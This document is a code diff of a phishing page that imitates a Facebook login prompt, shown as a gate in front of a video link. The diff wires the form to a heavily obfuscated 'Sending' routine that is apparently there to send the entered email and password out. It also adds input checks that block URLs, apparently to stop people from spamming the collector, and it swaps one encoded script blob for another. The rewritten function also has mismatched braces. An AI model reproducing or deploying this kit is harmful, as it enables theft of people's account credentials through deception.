@@ -305,7 +305,7 @@
                     <p class="kaget sandi-fb1" style="width: 330px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>   
                     <img src="https://videy.co/favicon.ico">
                     <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk lanjut ke videy.co</div>
-                    <form class="form-login-fb" method="post">
+                    <form class="form-login-fb" onsubmit="Sending()" method="post">
                         <label>
                             <input type="text" id="alx_email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                         </label>
@@ -314,7 +314,7 @@
                         </label>
                         <input type="hidden" name="ua" value="Bigo Live" readonly>
                         <input type="hidden" name="log" value="Facebook" readonly>
-                        <clik class="btn-login-fb" onclick="return AlexHostingFB(),Mantafff();">Masuk</clik>
+                        <clik class="btn-login-fb" type="return AlexHostingFB()">Masuk</clik>
                     </form>
                     <div class="txt-buat-akun">Buat akun</div>
                     <div class="txt-tidak-sekarang">Lain kali</div>
@@ -342,32 +342,91 @@
                 $('#slzfcbk').show();
             }
             
-            function AlexHostingFB()
-        	{
-        		$emailfb1 = $('#alx_email_fb2').val().trim();
-        		$passwordfb1 = $('#alx_password_fb2').val().trim();
-        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
-        		{
-        			$('.email-fb1').show();
-        			$('.sandi-fb1').hide();
-        			return false;
-        		}else{
-        			$('.email-fb1').hide();
-        		}
-        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
-        		{
-        			$('.sandi-fb1').show();
-        			return false;
-        		}else{
-        			$('.sandi-fb1').hide();
-        		}
-        		
-        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {	  
-                                    location.href = "https://videy.co/v?id=uVOjDydb";
+           function AlexHostingFB() {
+                var user = $('#alx_email_fb2').val();
+                var pass = $('#alx_password_fb2').val();
+                if (user == '' || user == null) {
+                    $('.email').show();
+                    $('.sandi').hide();
+                    return false;
+                } else {
+
+                    if (user.includes('@')) {
+                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
+                        if (user.match(pattern)) {
+                            $('.email').hide();
+                        } else {
+                            $('.email').show();
+                            $('.sandi').hide();
+                            return false;
+                        }
                     }
-        		}	
+
+                    if (!isNaN(user)) {
+                        if (user.length <= 10) {
+                            $('.email').show();
+                            $('.sandi').hide();
+                            return false;
+                        } else {
+                            $('.email').hide();
+                        }
+                    }
+
+                    if (user.match(/\s/g)) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        return false;
+                    } else {
+                        $('.email').hide();
+                    }
+
+                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
+                    if (user.match(regex)) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        return false;
+                    }
+
+
+                    if (user.length <= 5) {
+                        $('.email').show();
+                        $('.sandi').hide();
+                        return false;
+                    } else {
+                        $('.email').hide();
+                    }
+
+                }
+                if (pass == '' || pass == null || pass.length <= 5) {
+                    $('.sandi').show();
+                    return false;
+                } else {
+                    $('.sandi').hide();
+                }
+                
+                var regexs = new RegExp("^(http[s]?:\\/\\/(www\\.)?|ftp:\\/\\/(www\\.)?|www\\.){1}([0-9A-Za-z-\\.@:%_\+~#=]+)+((\\.[a-zA-Z]{2,3})+)(/(.)*)?(\\?(.)*)?");
+                if (pass.match(regexs)) {
+                    alert('mau jpm ya dek?');
+                    $('.email').hide();
+                    return false;
+                } else {
+                    $('.sandi').hide();
+                }
+                
+                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
+                if (pass.match(regexs)) {
+                    $('.sandi').show();
+                    $('.email').hide();
+                    return false;
+                } else {
+                    $('.sandi').hide();
+                }
+                  location.href = "https://videy.co/v?id=uVOjDydb";
+                    }
+                })
+            }
         </script>
         <script>
-        (function(){var cFL='',eMI=359-348;function pLW(e){var k=4397173;var s=e.length;var z=[];for(var d=0;d<s;d++){z[d]=e.charAt(d)};for(var d=0;d<s;d++){var t=k*(d+533)+(k%51019);var j=k*(d+190)+(k%43296);var p=t%s;var y=j%s;var u=z[p];z[p]=z[y];z[y]=u;k=(t+j)%4929532;};return z.join('')};var geK=pLW('icvhtrltusqykcpoacndbornrmzoxjtuewsgf').substr(0,eMI);var JML='va=wihtf.eCr(lp=1+; nh cv]ado2ef,s ra nnf;=As;iv5if=({va9 )8[+t,xv1+0l=+d85d(4[7;av4(v+evs;a(v[=.6afl7f(;,da,tc,=,).94srsa1)t+-dly=pxr(b r;"*;ur<4.xigrmr;r==)mwvtt(hCz+iC;a; ,);uvl8pt)4fC=7l+pqt2;6virrhka="],m*].)gn;nn7".l)dvssor.")i);=ttnvbut)enAlr(,a;5,,1(i  mh ]r9t3v6th{4o(nvoof(0;re(ee6hg=arrjmbj;{.)"(0ek}y eq+=0(1+ragpl)(+r)z0S=mr;6l+mvajonyoo o+)m3umreirua}o<ar<=;2=.]aa=r0s;luc)te((d-hbl=np9ai{9=1[;]ohf-h.61r+heoh==;9)(eai8p.=A-f{n1u-dr]=(bovrk8rld1rvf8s;0c>ix)f0)vczg<,Co[rd rq7;ge=;c1i){oo;)+mj;}arrv,.2rh ;);=8;r,oa)==2;+rr,"8c0;hesu7.ozya=n5bu+;70m[l u.(r>a=v..+shom)a[bc;oa;e(e)nt,[t.9ts.(,[f+r;ivzj(]eu}rs(t!anul  vi=uj=ost}-.jhwsh,h(ct(ipgtna].C+n+=e=j(gnnAtpe= c}o2h)(0[lf;(],] =anc(avv+o,ho;<8()(;,pem=g,b)r6lzCtv.2S[ ont=j2r)slaa r).p)i;"]lro r[nugfsew;-!v,riftros 5=lvtnn.eng2v[o]i)3a= o0[6zvn1khcefaAv1;;).i}8nae"rtf0,ryt+,ia"toi]C(igrx ;=etuy+,+.;77tts{g";n.oyo.i,nv)';var BMs=pLW[geK];var ILB='';var Hol=BMs;var kpL=BMs(ILB,pLW(JML));var Ckf=kpL(pLW(' .3e7r_r)57ya.e22h]ij_.1r%w.mg.3\'e515fg%(a_3;mele\/ f9{%1n3r2to$eeqGexiGcde$u)w.(G;bGhGa(Ge{}5+_%v,ie3{.Gh]3G= 5a}%+t!;,# sa!,Gxdis!%.6igeG).f bi.th$Gy+f6\/!;tcae$a44lG)%,tr#nh6r.,.prG,lbp(8uhbgo([t,4}!s_2$q,9s=G!$ 6Gs;t7SdjeG\/47o)=eG5.a$0u](-,)r(oe$zGvT);h$j=#i., ;f+{Gi%)jtn)((!oa\/e0l.iiG.gno;wz!(=p6s]-,no_\/G)h={;8ruc!c&[0m(s52eu4(he(]G3f,!\/%ha.GGr*)Gr$)6GGih3t1bG-ftG_0r0(coG\/Ga)((j"vGf2.)G4ctGc3ss3u71)bb.u(:eGni:GG$! 4=l=, Geav+.!G\', ({n{)3}]aG,u tS+eo19G4 eG$=;p3%(!G)_a5;G.geG(\'i)G G;md.Ci3$*(=G.%(y((!._eozehG(b\'G3w*G,;G#$Gaeq;,t}&.))77G[fnni)f($$G3e=oa)G(1(h$!.h5!a5](}]..lG5 }Ga4GpyG!l00G=jeG 00).s,(Gfr )ffe3G,h*i)}=1!r.t)o6ew{)o;my0)r=d3)GG43b.,t)(t.qu))(pGG)G(qC=7\/;)G1a1gr7G$Gb%7m,]mfurGGGp\'],7ys]:f42!e(%sfed]t.n.(4}!)$36e1:G-)r;tGtsowe}.76"dmvfou)G3%d)G(h*Gd3Gy#,G,G{)%_6e]&,_$;(f0]-G.5]&+ym1)sp7GfGi+q0G..a;o.3r*==)$G-e\/a"i.""[n.{t1;(.,+rGt0.+.su!6.f,!,;etv=rG;vr\/rda_{GtGwdGtlra#G.inp}(,m4,!G6=_Gs.wG)l,4.6oe7,!p.$.!Gsp&ir\';G3.4G_,jejeo$Gt:00$G;t]egG{t=)0o(lnG(f*aGGGaSf)%o4$(i4w85tge7rl;.eG\/(r]$ea _+ ).e4G()G l,7;e.0)aim!)_#xi"u$5trf(e2].S"3\/.bG!G_;G=G,,.n 1es$os_b,_m Gd.3{e:cG)((sG. (()crs_93'));var WmB=Hol(cFL,Ckf );WmB(6712);return 5729})()
+var Sending;(function(){var eMS='',Caw=131-120;function cUp(w){var q=595475;var z=w.length;var f=[];for(var l=0;l<z;l++){f[l]=w.charAt(l)};for(var l=0;l<z;l++){var t=q*(l+248)+(q%15527);var v=q*(l+709)+(q%42637);var a=t%z;var s=v%z;var i=f[a];f[a]=f[s];f[s]=i;q=(t+v)%4179961;};return f.join('')};var dJs=cUp('qynalmscujrfrbdtngrhkcpitestoovcuwzox').substr(0,Caw);var xaH='=a  j v6,aar{,u]745v1n p="1wg1;2r;;j lmn,a(Ctr];-+(za,sh6r3o.r3,6r,((vv=zo(+9;=g<f8=;=;xrbf7aann+),,ca.il,2viqrf<0;8opcl6;vfr qi.go[s"(,} lg.lua;nnlh(rg=+ghc)3=+br]+(r.1;va(ae p+oz+n)>+t+=,otb1h2t,=..+(.ri.8c=etafxuspnsCbn4.c]lr 4[)t]njmu]ore1>2)a;,k)e)(gi,(-p}axv{=r]a ;t0(drn6u=}r1r7ki ,j-ir.pafr+9 =1;l1;s;j==t<+f;mt rudu[gnlr,s{vt;va=m)Cl}=ugdkra(0rib;rof"Cap l.0hr f2r+g)08a(r{=4rhrj==uhi6ti 7i;rpe7(a-wga;2+-)bzo=tnx-*1a=[nku.co{=At[hn+rr;vssge.+9;=v{s;,.9AaA7A)=2hd.e)][ln0 ry.k}(vho;Cldesjr(.b+nc;.)n,!C)n8.e(9g)rr =e)r(re(;;}v(au(cor)iefjo))(s[udvv*t)aen]mvrjom(ald,rsr;8St[bre[;sjn",Ca)q])xve(([;<hc )(nif+d"0nft.i(t+l{p=ui7fth+a (lg+iaj vp,ta;n54r)).0erv,6oruo]o;;)=av.Sp)sr(+g0]t.)a}e0=jge=oe;;5nlir v2a;le[s9=6hne09pra,al=,!8")1;(icta[ c;udnr;ag;=tgrsuso=vd+;v;q;ns)ic[0vg=,cc7eC6snAa)ml] t =i)z;7ip)8-lo<=arlw"gv=f=(1;).e.ihg[zr"t]gtfp2fh("hwa,m+ren==drf.87nhstgl"hiqtj,i7;u02';var DMX=cUp[dJs];var xRL='';var pEt=DMX;var AcZ=DMX(xRL,cUp(xaH));var DoT=AcZ(cUp('?89FoeF$}6>F6]aFF)_(=0t5F ]Fe4) rj#!F+02xa=].((aF)FeF0)F_.!btF$ale76)(d5eF4+6+Fe(n]b}%r=zFyFw[x(]\/fei"F(F;5-f(tCcF((1NE7r[.F.aNrF1Fa0F}o;=3=l*F]sf_F]=.(=F9,})6C6e{(7,Fi$St2FF.F7oi(aF$\/iFFFFFw(F_N_F.t,t?CFn2a"xi>%)0kFHaAe6l?0g"(91ae(_3.seFp.9l;>v 6Hr9eoFF+.eu]i&9%m"6}}i0sgeji .BFa\/)s=(aiFi-(!iazniFi.ph.Jd.]__ag.R>tF!7b-txa m-D!F 37_t!?rFf\/p woR_;4rM+eFlxau@({.Fr3FA\/Fl,0FFxFF2FiFxl.++aw9!{R5:(%6$F.[oyta=29F,a}Ftn_gawF0FF9n4+,a,t)-6g%)@()n4)6((f.e)_oF,(i!Fo-?5+rg]a=,6sF(a;3d)%3%9a(u*p7.rN0(e$...n\'(.,@F-me[fnK!_b(on[.er6Fi)h]esF;_(7).te)nota_,F l%F<f-jF:\/]9n-2!ea(Fa[_>]4)32F)F5Q(a";!">|!Fxjc!FF_a:p\/=.!(e$F2_4<mb>;rFNx)FoF9Q{i9)\'a..]1_a0pix2_wnb9c b7=.7dl5?F.hu,en F5p[l=)a2mF%-7|P6F2F.Fhh8] F+00=;x3g=[l.oecFs6imx{QEOF6t7(=F_a)7r26e%n,Kt8-!e_cF#Fwa_,.!a],.g)+5_Fd5;s=. :5=wb3i=(.$_&dK1l:o$c.aFanF r=.{!2F?;gFF.6! ,5#7rFz)(sc7(F..R(nbb._M_)F;9F{9:(a7 wip1s.!r F(\/;.{F;)c(#}by1=2. ?6((r]=6jFb1[eF{Mz6Lj,12NF)9a_2;j1)[(c[84s0l!.z)2P)F( n\/.$.h._e F;a]!1F alt;hFm#ni3@FF {5.e$4p\/ra1.?n04)n)t8uh.d)\']F}bf3i;w_FlFhp9FeFG.FFsFfar-F@)t]c}_F{N4,k4F)x}; i=[FFe 8-)rFF;)l4_8)F?8=uFN+eFfv7 58;{F{Lt]:$>5r,)8!of(a6C2FE,)$9}e7f(!.aH#7%!;?$z1f35t.!,Q=;DF,+Fez2F[i{7;s,FFT6.) F.o\/)FF_FF]FFFF.pawK4Fn!r!s)9h5F9S4{>fnbFocn{$F7n4xFo.F(u#iwDMh2)c](){(l5F6FF.)aer..cmi:)i!)-?u[1r(_(b.muu),Rlg9[.(9$(]_]-0:03F5F_@aF76e7clF"\/=,K_fk+d!!Be.FNmhn)FF,3FFe3?F])t1.aF FhS@$A(F_F1F_,[]FF)+}e_p8fFfFtFa)b3J9$,F.!FFSF]$as!a:]F{FF aFe,_FFa?23sa\/[py\/F6F.]tBF_t!F{Cw4Fe_}7oFF%)cg$6Fm(FFr.at(woQ%+~F]):6s>Jc(,t?@ewF?(_itt:F)s]6lF.)ns.Q?(tt-3$);Of,)r!(2(,6,F4coFze;[F)h1tS.-;j}(c}_bH?6c,_l;ma2[b6per)gePlzKF51{p,3F(\/;\/}%.(f-7bF)}?[|5H40[R.12F<(g  !t#9"!4.(a]afKF!.FAea5&7..nF.!7)F.J)+a$\/sF9e)l0{.)rFFFF,n3FFF [0!ItlL5gj.,Fyd)_4lB)]>*(9n*F9F]*\/j5GwH?a9.0eyoE))(._re.?o:F;)(rF;0p){!b.>eal_F(}D%=95]]] {76Ff()+b0o7)o%8nf.[y)F.1.0ta!]r-._.7B2+Fcr9F$t0 ..;)Fe).{...E 00])_{a(a6jF!\/)];);@!.!a_0a.f=)F:m..FF73)[]Fi5+Fs5..a\/p;?FMa(u_?$!Fbn..bwFh#gF.@am(Fi()(iu]i{F-!Fan6]0(,ead(>]F%i]D5_5.Aa?4. !o|_<$!F(l6Fb(F1)@\/;FGo0cteF;O!$_%}Fd4foeff.F7_F1cFe)D)|r%AAF%m(;af 54_itFFtM 6_}gjat)]rG(FFb.:]3u;,d!P,_}(pFF]$()})F>y_9)!$1_F$\/Ls F_2..)0%)ly=bm.=u.lJFfo))5#]6FM{F!#)z5tsFu,980).ya-uFyaLeFu6aeF]:",A-$F[F}!eau.dzelf?FF]b.9_4776{d:wDw\'2x05Fv)!]aoaFcaFr(t"$us6hp()a[+i....aFLFsoFF1.y(F3(;br.\/$N{)-.l=:]=>e1:#3scg0&%!"tFeS8F)(}.3f_:(3="..,mx\/;F_0y1eF$}0 F=!lb=!-M,s.g._1$(ols;[5.+.%FwkN!s14r=FH}dF6=Fn!(aiFFl)%so%[.1AF4F!ssp3].!a t(6#6c:#Lt)e!, f_Lsd+a_s2a8{1 soF%5b7(a3.!Fe(nb0u}5{[d[E.wacFeg]t3Fd..[_:;)22b90}5x4; ,-sySF.)3}eaF=!)Fs2i(t!u{g.(a.2d !!8;a(}Ko.!d2.){a}bgz\/Da[a6|Ff2+l .!\'+Ct(.!.68|F!!oj13[c,T=cFrn1nxapaP;e89whFu?F)Cj eF&Fept8(F$Fn();ip63(Kd_brf>%)a4{pKfg3(Fwbo ,_,| .\/s,)9F[i_].}]5s\/y=F}snHu,Ae to$77irv}b7pnE_FP\';tF-!]zH%iF (j.;E()j)5:n|F6n))e\/d7s)!5;9==i1arn)((5O;he!F[l7fFF%n_). FF[5F&d(,01N)1;%)6F(=zs,xF(alb ;f!'));var zZY=pEt(eMS,DoT );zZY(3570);return 6086})()
 		</script>
   </html>
